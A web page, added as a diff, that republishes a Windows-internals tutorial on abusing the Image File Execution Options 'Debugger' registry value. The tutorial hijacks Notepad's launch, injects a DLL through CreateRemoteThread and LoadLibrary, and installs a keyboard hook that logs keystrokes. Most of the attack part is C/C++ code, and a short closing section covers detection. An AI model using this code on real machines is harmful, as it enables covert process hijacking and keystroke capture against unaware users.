@@ -1,0 +1,338 @@
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Code Injection with Image File Execution Options — TrainSec article | 1200km</title>
+<meta name="description" content="Code Injection with Image File Execution Options by Pavel Yosifovich, republished from TrainSec.net with permission.">
+<meta name="author" content="Pavel Yosifovich"><meta name="trainsec-author" content="Pavel Yosifovich"><meta name="trainsec-source" content="https://trainsec.net/library/windows-internals/code-injection-with-image-file-execution-options/"><meta name="keywords" content="Pavel Yosifovich, Windows programming, Technical walkthrough, Windows programming, C/C++">
+<meta property="article:published_time" content="2024-07-07">
+<link rel="canonical" href="https://1200km.com/articles/trainsec/windows-internals-code-injection-with-image-file-execution-options.html">
+<meta property="og:type" content="article"><meta property="og:title" content="Code Injection with Image File Execution Options"><meta property="og:url" content="https://1200km.com/articles/trainsec/windows-internals-code-injection-with-image-file-execution-options.html">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","@id":"https://1200km.com/articles/trainsec/windows-internals-code-injection-with-image-file-execution-options.html#article","url":"https://1200km.com/articles/trainsec/windows-internals-code-injection-with-image-file-execution-options.html","headline":"Code Injection with Image File Execution Options","author":{"@id":"https://1200km.com/#person"},"publisher":{"@id":"https://1200km.com/#person"},"mainEntityOfPage":{"@id":"https://1200km.com/articles/trainsec/windows-internals-code-injection-with-image-file-execution-options.html#webpage"},"datePublished":"2024-07-07","dateModified":"2026-08-03","isBasedOn":"https://trainsec.net/library/windows-internals/code-injection-with-image-file-execution-options/"}</script>
+<style>
+:root{color-scheme:dark}*{box-sizing:border-box}body{margin:0;background:#050c1a;color:#dbe7fb;font:16px/1.7 system-ui,-apple-system,Segoe UI,sans-serif}.wrap{width:min(1040px,calc(100% - 32px));margin:auto}.site-header{border-bottom:1px solid #1a3060}.site-header .wrap{display:flex;align-items:center;justify-content:space-between;min-height:68px;gap:18px}.brand{color:#eef5ff;text-decoration:none;font-weight:700}.brand small{display:block;color:#8fa8cf;font-size:.75rem;letter-spacing:.08em;text-transform:uppercase}nav{display:flex;flex-wrap:wrap;gap:14px}nav a{color:#a9c0e4;text-decoration:none}.article{padding:54px 0 70px}.eyebrow{color:#42d6a1;font-size:.78rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase}.article h1{max-width:900px;margin:10px 0 12px;font-size:clamp(2.1rem,5vw,4rem);line-height:1.08}.meta{color:#91a8ca}.rights-disclaimer{margin:26px 0;padding:16px 18px;border:1px solid #2a6c68;border-radius:10px;background:rgba(13,67,66,.28);color:#c1dad7}.rights-disclaimer a,.source-attribution a,.related-links a{color:#72aaff}.tag-row{display:flex;flex-wrap:wrap;gap:6px;margin:18px 0}.tag{padding:4px 8px;border-radius:999px;background:#11294e;color:#9fc1f7;font-size:.75rem}.trainsec-content{margin-top:34px}.trainsec-content h2,.trainsec-content h3{line-height:1.25;color:#eef5ff;margin-top:2.2em}.trainsec-content img{display:block;max-width:100%;height:auto;margin:1.5rem auto;border-radius:8px}.trainsec-content figure{margin:1.8rem 0;padding:12px;border:1px solid #243e68;border-radius:9px;background:#08152b}.trainsec-content figcaption{color:#9fb4d4;font-size:.9rem}.trainsec-content iframe{display:block;width:100%;min-height:360px;border:0;border-radius:8px}.trainsec-content pre{overflow:auto;padding:16px;border:1px solid #243e68;border-radius:8px;background:#071225}.trainsec-content code{font-family:ui-monospace,SFMono-Regular,Menlo,monospace}.related-links{margin-top:42px;padding-top:22px;border-top:1px solid #1a3060}.related-links h2{color:#eef5ff}.source-attribution{margin-top:30px;padding-top:22px;border-top:1px solid #1a3060;color:#a9bbd8}.source-attribution strong{color:#eef5ff}footer{padding:25px 0 45px;border-top:1px solid #1a3060;color:#91a8ca}@media(max-width:680px){.site-header .wrap{align-items:flex-start;flex-direction:column;padding:14px 0}.article{padding-top:38px}.trainsec-content iframe{min-height:230px}}
+</style></head><body>
+<header class="site-header"><div class="wrap"><a class="brand" href="/"><strong>Andrey Pautov</strong><small>Security research</small></a><nav aria-label="Primary"><a href="/cti.html">Research</a><a href="/guides.html">Library</a><a href="/articles/">Articles</a><a href="/cyber-knowledge/">Cyber Knowledge</a></nav></div></header>
+<main class="wrap" data-pagefind-body><article class="article">
+<p class="eyebrow">TrainSec source integration · Windows programming · Technical walkthrough</p><h1>Code Injection with Image File Execution Options</h1>
+<p class="meta"><strong>Author:</strong> Pavel Yosifovich · <strong>Published:</strong> July 8, 2024</p>
+<div class="tag-row"><span class="tag">Windows programming</span><span class="tag">C/C++</span></div>
+<aside class="rights-disclaimer"><strong>Rights and attribution.</strong> All rights reserved. Rights belong to TrainSec.net and Pavel Yosifovich. 1200km.com is the publishing platform. Published with permission from the TrainSec rights holders. <a href="https://trainsec.net/library/windows-internals/code-injection-with-image-file-execution-options/" target="_blank" rel="noopener noreferrer">Original source ↗</a></aside>
+<div class="trainsec-content">
+
+<p class="wp-block-paragraph"></p>
+
+
+
+<p class="wp-block-paragraph">A well-known features of Windows is the Image File Execution Options registry key located in <strong>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</strong>. Under that key, key names with executable files (e.g. Notepad.exe) can be created and various options can be set. These options are observed when a process with the key name (from any directory) is about to be created. A convenient tool to set these options is the <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff549557%28v=vs.85%29.aspx" rel="nofollow noopener" target="_blank">Gflags.exe</a> utility, available as part of the <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff551063%28v=vs.85%29.aspx" rel="nofollow noopener" target="_blank">Debugging Tools for Windows</a>.</p>
+
+
+
+<p class="wp-block-paragraph">One of the useful values is “Debugger” that allows another process (classically, a debugger) to be launched when the specific executable is requested to be launched. This allows debugging startup code in processes that start indirectly, such as Windows Services that are launched by the Service Control Manager (SCM). The “debugger” process is provided with the original executable and the command line with which it was attempted to launch.</p>
+
+
+		<div data-elementor-type="section" class="elementor elementor-1903 elementor-location-single" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-6b107e4d e-flex e-con-boxed e-con e-parent" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;gradient&quot;}">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-60b2ad76 e-con-full e-flex e-con e-child" data-element_type="container" data-e-type="container">
+				<div class="elementor-element elementor-element-629e0fe6 elementor-widget elementor-widget-heading" data-element_type="widget" data-e-type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">Liked the content? </h2>				</div>
+				</div>
+				<div class="elementor-element elementor-element-5eb3479f elementor-widget elementor-widget-text-editor" data-element_type="widget" data-e-type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p><span style="white-space-collapse: preserve;">Subscribe to the free TrainSec knowledge library, and get insider access to new content, discounts and additional materials. </span></p>								</div>
+				</div>
+				<div class="elementor-element elementor-element-e01f929 elementor-widget elementor-widget-html" data-element_type="widget" data-e-type="widget" data-widget_type="html.default">
+				<div class="elementor-widget-container">
+					<div class="ml-embedded" data-form="2W0Zsi"></div>				</div>
+				</div>
+				</div>
+					</div>
+				</div>
+				</div>
+
+
+
+<p class="wp-block-paragraph">Although this value is typical for debuggers, there is nothing in an executable that states it is in fact a debugger. This means any executable can be placed there. A simple example is placing “calc.exe” for Notepad.exe key. Here’s the snapshot from Gflags:</p>
+
+
+
+<figure class="wp-block-image size-full"><img fetchpriority="high" fetchpriority="high" decoding="async" width="532" height="527" alt="image1 1" class="wp-image-370"  src="https://trainsec.net/wp-content/uploads/2024/07/image1-1.png" srcset="https://trainsec.net/wp-content/uploads/2024/07/image1-1.png 532w, https://trainsec.net/wp-content/uploads/2024/07/image1-1-100x100.png 100w, https://trainsec.net/wp-content/uploads/2024/07/image1-1-300x297.png 300w, https://trainsec.net/wp-content/uploads/2024/07/image1-1-150x150.png 150w" sizes="(max-width: 532px) 100vw, 532px"/></figure>
+
+
+
+<p class="wp-block-paragraph">This setting (after applied) will cause any attempt to launch Notepad.Exe to result in Calc.Exe being launched instead.</p>
+
+
+
+<p class="wp-block-paragraph">This can be a fun thing to do around the office. But let’s look at it in another way. Say we want to inject some code to a target process when it’s launched and stay hidden while leaving no other process lingering around. For example, suppose we want to capture key strokes from Notepad-like applications. We can leverage the “Debugger” value to launch our own process (let’s assume the user was tricked to run some script to set it up – although this does require admin rights); once we launch – we can launch the original intended executable (remember it’s provided to the debugger process as part of the command line). But because we’re doing the launching, we have full privileges to the target process and can inject code in a variety of ways. This posts shows one way to do that. I’ll also discuss how one can detect such a presence with freely available tools.</p>
+
+
+
+<h2 class="wp-block-heading"><strong>Key Logger</strong></h2>
+
+
+
+<p class="wp-block-paragraph">Let’s use the key logger scenario – we want to know what keys the user is typing in Notepad or a similar application. We’ll need an executable that would do the injection and a DLL to be injected. Let’s make the injector named Injector.Exe and the DLL named Injected.Dll.</p>
+
+
+
+<p class="wp-block-paragraph">Our executable would run instead of Notepad or whatever executable we choose to replace (we’ll set it up as shown above using Gflags; let’s assume it’s already set). This means the command line originally meant for Notepad is now passed to our main function’s command line. Our main function may start like this:</p>
+
+
+
+<pre class="wp-block-code"><code>int wmain(int argc, wchar_t* argv[]) {
+	assert(argc &gt; 1);</code></pre>
+
+
+
+<p class="wp-block-paragraph">argc must be at least two. argv[0] would be the path to our injector.exe executable and argv[1] would be Notepad’s path. More arguments could be passed along to open a specific file in the case for Notepad. Since we want to create the real Notepad (or whatever), we can build its command line like so:</p>
+
+
+
+<pre class="wp-block-code"><code>wchar_t commandLine[MAX_PATH * 2];
+wcscpy_s(commandLine, argv[1]);
+if (argc &gt; 2) {
+	wcscat_s(commandLine, L" ");
+	wcscat_s(commandLine, argv[2]);
+}</code></pre>
+
+
+
+<p class="wp-block-paragraph">In this case we assume there would be no more than one extra argument, but it would be easy to build it for any number of command line args.</p>
+
+
+
+<p class="wp-block-paragraph">Now we’re ready to create the original process. But there is one important caveat: if we just call CreateProcess normally, the Image Execution File Options would just execute our own injector yet again, and we’ll be in an infinite loop creating injectors, never creating any Notepad processes; there must be some way to break the cycle.</p>
+
+
+
+<p class="wp-block-paragraph">Since the “debugger” value is for debuggers – clearly the debugger must be able to create the correct process; the trick is to use the DEBUG_PROCESS flag when creating the process:</p>
+
+
+
+<pre class="wp-block-code"><code>PROCESS_INFORMATION pi;
+STARTUPINFO si = { sizeof(si) };
+
+// create the actual process with the debug flag to avoid an infinite loop
+
+BOOL bCreated = ::CreateProcessW(nullptr, commandLine, nullptr, nullptr, FALSE,
+DEBUG_PROCESS, nullptr, nullptr, &amp;si, &amp;pi);</code></pre>
+
+
+
+<p class="wp-block-paragraph"><br>This creates the actual process that we want. Now Notepad is at our mercy, so to speak.&nbsp;</p>
+
+
+
+<h2 class="wp-block-heading"><strong>DLL injection</strong></h2>
+
+
+
+<p class="wp-block-paragraph">The next step would be to inject our DLL. The well-known trick here is to create a thread inside the new process that runs the <a href="https://msdn.microsoft.com/EN-US/library/windows/desktop/ms684175(v=vs.85).aspx" rel="nofollow noopener" target="_blank">LoadLibrary</a> function since they have the same prototype (return a 32 bit value and accept a pointer) on the binary level. <strong>LoadLibrary</strong> would load our DLL, for which <strong>DllMain</strong> would be called. There we can put anything we want that runs in the context of the new process.</p>
+
+
+
+<p class="wp-block-paragraph">Before we can do that, however, we must allocate space and copy the DLL’s path so that <strong>LoadLibrary</strong> can find its target (it is in Notepad’s address space) (error checking omitted for brevity):</p>
+
+
+
+<pre class="wp-block-code"><code>WCHAR path[MAX_PATH];
+::GetModuleFileName(nullptr, path, MAX_PATH);
+*wcsrchr(path, L'\\') = L'\0';
+wcscat_s(path, MAX_PATH, L"\\Injected.Dll");
+
+// allocate buffer for the DLL path name
+void* pPathBuffer = ::VirtualAllocEx(pi.hProcess, nullptr, MAX_PATH * sizeof(WCHAR), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+
+// write the path
+SIZE_T written;
+::WriteProcessMemory(pi.hProcess, pPathBuffer, path, MAX_PATH * sizeof(WCHAR), &amp;written);
+</code></pre>
+
+
+
+<p class="wp-block-paragraph">Before creating the remote thread, there is another minor detail to consider. Eventually, we want our DLL to use the <a href="https://msdn.microsoft.com/EN-US/library/windows/desktop/ms644990(v=vs.85).aspx" rel="nofollow noopener" target="_blank">SetWindowsHookEx</a> function to install a keyboard hook on Notepad’s main thread. The problem is – how would the DLL know the thread ID of Notepad’s main thread?</p>
+
+
+
+<p class="wp-block-paragraph">One way to about it is enumerate all threads in the system with <a href="https://msdn.microsoft.com/EN-US/library/windows/desktop/ms682489(v=vs.85).aspx" rel="nofollow noopener" target="_blank">CreateToolhelp32Snapshot</a>, find Notepad and take the first thread ID that shows up. This would probably work, but looks like an overkill, and not very efficient. Our executable knows the main thread ID of Notepad since we’ve created the process and got this info back in the PROCESS_INFORMATION structure. All we need to do is somehow pass this information to our DLL running under the target process.</p>
+
+
+
+<p class="wp-block-paragraph">One possible way is to tack this information on the command line at the end, hoping this doesn’t bother our target process and then get it from there by calling <a href="https://msdn.microsoft.com/EN-US/library/windows/desktop/ms683156(v=vs.85).aspx" rel="nofollow noopener" target="_blank">GetCommandLine</a> and looking for the last argument.</p>
+
+
+
+<p class="wp-block-paragraph">Here’s another way, somewhat unusual. We’ll create a semaphore with a name known to the DLL whose maximum count would be the thread ID and the initial count would be one less than that. Then our DLL would get a handle to that semaphore, increment its count by one and get back its previous count – the thread ID!</p>
+
+
+
+<p class="wp-block-paragraph">Here’s some code to prepare the semaphore:</p>
+
+
+
+<pre class="wp-block-code"><code>// create a semaphore whose count represents the main thread ID
+HANDLE hSemaphore = ::CreateSemaphore(nullptr, pi.dwThreadId - 1, pi.dwThreadId, L"InjectedMainThread");
+
+// duplicate in the injected process so the semaphore survives after the injected process goes away
+HANDLE hTarget = nullptr;
+::DuplicateHandle(::GetCurrentProcess(), hSemaphore, pi.hProcess, &amp;hTarget, 0, FALSE, DUPLICATE_SAME_ACCESS);
+</code></pre>
+
+
+
+<p class="wp-block-paragraph">Why duplicate the semaphore handle inside the target process? Well, once our process goes away (which is very soon after all preparations), the semaphore handle would close and it would be lost. To make sure it survives, we’ll duplicate a handle into the target process, so the semaphore is guaranteed to survive.</p>
+
+
+
+<p class="wp-block-paragraph">We’re almost done. We now need to create the remote thread like so:</p>
+
+
+
+<pre class="wp-block-code"><code>HANDLE hRemoteThread = ::CreateRemoteThread(pi.hProcess, nullptr, 0,
+	(PTHREAD_START_ROUTINE)::GetProcAddress(::GetModuleHandle(L"kernel32"), "LoadLibraryW"),
+	pPathBuffer, 0, nullptr);
+</code></pre>
+
+
+
+<p class="wp-block-paragraph">The thread would start by loading our injected DLL (in the target process, of course).</p>
+
+
+
+<p class="wp-block-paragraph">One last thing to do. Since we’ve created the target process as a debuggee, our injector process is assumed to be a debugger. By default, when a debugger exists – the target debuggee terminates and we want to prevent that. The following call makes that happen:</p>
+
+
+
+<pre class="wp-block-code"><code>::DebugSetProcessKillOnExit(FALSE);</code></pre>
+
+
+
+<p class="wp-block-paragraph">And the injection is done. Now over to the DLL loaded in the target process.</p>
+
+
+
+<h2 class="wp-block-heading"><strong>Setting up the Hook</strong></h2>
+
+
+
+<p class="wp-block-paragraph">Our DLL comes alive in the normal DllMain that is made because our remote thread loaded our injected DLL. Here’s what this looks like:</p>
+
+
+
+<pre class="wp-block-code"><code>BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, PVOID) {
+	switch (reason) {
+	case DLL_PROCESS_ATTACH:
+		g_hInstDll = hModule;
+
+		// create a separate thread to set up the hook
+		::CreateThread(nullptr, 0, SetupHook, nullptr, 0, nullptr);
+		break;
+	}
+	return TRUE;
+}
+</code></pre>
+
+
+
+<p class="wp-block-paragraph">Nothing much going on. We save the module instance for later and create yet another thread to set up the hook. Why don’t we just set it up here? Two reasons: first, doing a lot of things in DllMain is not recommended, as it’s running under the Loader Lock which prevents (among other things) loading of other DLLs. Second, our hook needs a message pump and we can’t tie up DllMain for this.</p>
+
+
+
+<p class="wp-block-paragraph">Our thread sets up the WH_KEYBOARD hook like so:</p>
+
+
+
+<pre class="wp-block-code"><code>DWORD CALLBACK SetupHook(PVOID) {
+	// get the main thread ID
+	HANDLE hSemaphore = ::OpenSemaphore(SEMAPHORE_ALL_ACCESS, FALSE, L"InjectedMainThread");
+	LONG id = 0;
+	::ReleaseSemaphore(hSemaphore, 1, &amp;id);
+
+	// wait a bit for the main thread to be ready for input
+	::Sleep(100);
+
+	// set up the hook
+	HHOOK hHook = ::SetWindowsHookEx(WH_KEYBOARD, HookCallback, g_hInstDll, id + 1);
+
+	// pump messages
+	MSG msg;
+	while (::GetMessage(&amp;msg, nullptr, 0, 0))
+		::DispatchMessage(&amp;msg);
+
+	return 0;
+}
+</code></pre>
+
+
+
+<p class="wp-block-paragraph">Here is where we need the main thread ID of the current process; we get it by calling <a href="https://msdn.microsoft.com/EN-US/library/windows/desktop/ms684326(v=vs.85).aspx" rel="nofollow noopener" target="_blank">OpenSemaphore</a> to get to our semaphore, then <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms685071(v=vs.85).aspx" rel="nofollow noopener" target="_blank">ReleaseSemaphore</a> reports the previous semaphore count which we use in <strong>SetWindowsHookEx</strong>.</p>
+
+
+
+<p class="wp-block-paragraph">Finally, our hook procedure can do anything with the key information. For this demo, we’ll just output it to the debugger and use a tool such as <a href="https://technet.microsoft.com/en-us/sysinternals/debugview" rel="nofollow noopener" target="_blank">DebugView</a> from Sysinternals to capture the output:</p>
+
+
+
+<pre class="wp-block-code"><code>LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam) {
+	if (code &lt; 0)
+		return ::CallNextHookEx(nullptr, code, wParam, lParam);
+
+	if (code == HC_ACTION) {
+		// log key stroke
+		::wsprintfW(buffer, L"Pressed: %d, Key code: %d\n", (lParam &amp; (1 &lt;&lt; 30)) ? 1 : 0, wParam);
+		::OutputDebugString(buffer);
+	}
+	return ::CallNextHookEx(nullptr, code, wParam, lParam);
+}
+</code></pre>
+
+
+
+<p class="wp-block-paragraph">And that’s it. Here’s some output from DebugView when the user starts notepad in the normal way (after setting up with Gflags) and started typing “Hello”:</p>
+
+
+
+<figure class="wp-block-image size-full"><img decoding="async" width="866" height="376" alt="image3 1" class="wp-image-385"  src="https://trainsec.net/wp-content/uploads/2024/07/image3-1.png" srcset="https://trainsec.net/wp-content/uploads/2024/07/image3-1.png 866w, https://trainsec.net/wp-content/uploads/2024/07/image3-1-600x261.png 600w, https://trainsec.net/wp-content/uploads/2024/07/image3-1-300x130.png 300w, https://trainsec.net/wp-content/uploads/2024/07/image3-1-768x333.png 768w" sizes="(max-width: 866px) 100vw, 866px"/></figure>
+
+
+
+<h2 class="wp-block-heading"><strong>Identifying Injections</strong></h2>
+
+
+
+<p class="wp-block-paragraph">Is it possible to detect such injections? Certainly. If we suspect an injected DLL, we can start <a href="https://technet.microsoft.com/en-us/sysinternals/processexplorer" rel="nofollow noopener" target="_blank">Process Explorer</a> and look for suspicious DLLs like the following:</p>
+
+
+
+<figure class="wp-block-image size-full"><img decoding="async" width="772" height="461" alt="image2 1" class="wp-image-386"  src="https://trainsec.net/wp-content/uploads/2024/07/image2-1.png" srcset="https://trainsec.net/wp-content/uploads/2024/07/image2-1.png 772w, https://trainsec.net/wp-content/uploads/2024/07/image2-1-600x358.png 600w, https://trainsec.net/wp-content/uploads/2024/07/image2-1-300x179.png 300w, https://trainsec.net/wp-content/uploads/2024/07/image2-1-768x459.png 768w" sizes="(max-width: 772px) 100vw, 772px"/></figure>
+
+
+
+<p class="wp-block-paragraph">Clearly the injected DLL is there, but in a real scenario it will have an inconspicuous name and some convincing description, so it won’t be easy, since processes typically load dozens of DLLs.</p>
+
+
+
+<p class="wp-block-paragraph">Also if we look at the process tree in Process Explorer, we would find Notepad to be orphaned. Looking at its properties confirms it:</p>
+
+
+
+<figure class="wp-block-image size-full"><img decoding="async" width="433" height="555" alt="image4 1" class="wp-image-387"  src="https://trainsec.net/wp-content/uploads/2024/07/image4-1.png" srcset="https://trainsec.net/wp-content/uploads/2024/07/image4-1.png 433w, https://trainsec.net/wp-content/uploads/2024/07/image4-1-234x300.png 234w" sizes="(max-width: 433px) 100vw, 433px"/></figure>
+
+
+
+<p class="wp-block-paragraph">This should be a red flag, as Notepad’s parent would typically be Explorer, but it’s actually our injector process that is no longer there.</p>
+
+
+
+<p class="wp-block-paragraph">Another useful tool is Process Monitor, that can show creation of processes and threads, registry and file system activity and more. For our purposes, we would see the Injector process being created before Notepad, we would see the registry Image File Execution Options key read with the Debugger value. I’ll leave that as an exercise to the reader.</p>
+
+
+
+<p class="wp-block-paragraph">The source code is available <a href="https://onedrive.live.com/redir?resid=DF8D2BC189D46C8A!328160&amp;authkey=!ALEtXOPrJ8XUetk&amp;ithint=file%2czip" rel="nofollow noopener" target="_blank">here</a>.</p>
+				</div>
+<section class="related-links" aria-labelledby="related-heading"><h2 id="related-heading">Related TrainSec publications</h2><ul><li><a href="/articles/trainsec/windows-internals-building-a-process-tree.html">Building a Process Tree</a> <span>(Pavel Yosifovich)</span></li><li><a href="/articles/trainsec/windows-internals-process-tree-in-windows.html">How to Build a Process Tree in Windows with Code</a> <span>(Pavel Yosifovich)</span></li><li><a href="/articles/trainsec/windows-internals-keyboard-hook-with-with-image-file-execution-options.html">Keyboard Hook with Image File Execution Options</a> <span>(Pavel Yosifovich)</span></li><li><a href="/articles/trainsec/windows-internals-understanding-uac-virtualization.html">Understanding UAC Virtualization: A Security Mechanism for Legacy Applications</a> <span>(Pavel Yosifovich)</span></li></ul></section>
+<p class="source-attribution"><strong>Original publication:</strong> <a href="https://trainsec.net/library/windows-internals/code-injection-with-image-file-execution-options/" target="_blank" rel="noopener noreferrer">TrainSec Knowledge Library ↗</a><br>Original text, screenshots, infographics, videos, and author biography remain attributed to TrainSec.net and the named author. This page is hosted by 1200km.com with permission from the TrainSec rights holders.</p>
+</article></main><footer><div class="wrap"><a href="/articles/trainsec-library.html">Back to TrainSec Knowledge Library</a> · <a href="/articles/trainsec/authors.html">Authors</a> · <a href="/articles/trainsec/domains.html">Domains</a> · <a href="/articles/">All articles</a></div></footer>
+</body></html>
